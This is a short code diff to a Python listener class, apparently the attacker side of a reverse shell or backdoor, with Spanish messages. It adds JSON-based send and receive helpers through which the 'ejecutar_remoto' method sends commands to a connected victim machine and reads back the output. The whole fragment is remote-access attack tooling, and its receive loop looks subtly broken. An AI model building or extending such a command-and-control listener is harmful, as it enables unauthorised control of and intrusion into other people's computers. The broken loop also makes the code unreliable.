@@ -1,6 +1,5 @@
 import socket
-
-from pynvim import command
+import json
 
 class Listener:
 	def __init__(self, ip, port):
@@ -14,9 +13,22 @@ class Listener:
 		print("[+] Tenemos una conexion de " + str(address))
 
 
+	def reliable_send(self, data):
+		json_data = json.dumps(data)
+		self.connection.send(json_data)
+
+	def reliable_recv(self):
+		json_data = ""
+		while True:
+			try:
+				json_data = self.connection.recv(1024)
+				return json.loads(json_data)
+			except ValueError:
+				continue
+
 	def ejecutar_remoto(self, command):
-		self.connection.send(command)
-		return self.connection.recv(1024)
+		self.reliable_send(command)
+		return self.reliable_recv()
 
 	def run(self):
 		while True:
